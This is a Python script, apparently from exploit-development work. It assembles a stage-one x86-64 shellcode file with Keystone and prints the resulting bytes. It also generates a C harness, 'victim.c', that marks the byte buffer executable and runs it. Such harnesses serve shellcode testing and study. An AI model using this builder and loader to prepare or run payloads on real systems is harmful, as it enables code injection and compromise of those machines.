
import os
from keystone import *
import sys

fp = os.path.dirname(os.path.abspath(__file__))

def readStage1():
    with open(f"{fp}/Stage1.shellcode", "r") as f:
        return f.read()
def deComment(str):
    final = ""
    for s in str.split("\n"):
        final += s.split(";",1)[0] + "\n"
    return final

def main():
    if len(sys.argv) < 2:
        print(f"Usage: python {sys.argv[0]} len_of_payload")
    stage1 = readStage1()
    payload = stage1.replace("_PAYLOAD_LENGTH_", hex(int(sys.argv[1])))
    payload = deComment(payload)
    print(payload)
    ks = Ks(KS_ARCH_X86, KS_MODE_64)
    encoding, count = ks.asm(payload.encode('utf-8'))
    print("ASM successfully")
    byteCodes = [] 
    for data in encoding:
        char = hex(data)[2:]
        if len(char) == 1:
            char = "0" + char
        byteCodes.append(char)
    print(f"ByteCode Array: {byteCodes}")
    print()
    print(f"Byte Code: {''.join(byteCodes)}")
    print()
    c_code = "\\x"+"\\x".join(byteCodes) 
    print(f'C Style: {c_code}')
    print("")
    print("msf c code: ")
    
    final_file = f"""#include <unistd.h>
#include <sys/mman.h>

#define SCSSIZE {len(byteCodes)}
unsigned char buf[SCSSIZE] =  
"""
    c_code = [byteCodes[i:i+16] for i in range(0,len(byteCodes),16)]
    c_array = []
    for c in c_code:
        code = "\\x"+"\\x".join(c)
        c_array.append(f'\t"{code}"')
    tail = """
     
int main(int argc, char *argv[]) {
    // create executable memory
    mprotect((void*)((intptr_t)buf & ~0xFFF), SCSSIZE, PROT_READ|PROT_EXEC);  
    int (*exeshell)() = (int (*)()) buf;  
    (int)(*exeshell)(); // execute shellcode

    return 0;
}"""
    final_file += "\n".join(c_array) + ";" + tail
    with open(f"{fp}/victim.c", "w") as f:
        f.write(final_file)
    print(final_file)

if __name__ == "__main__":
    main()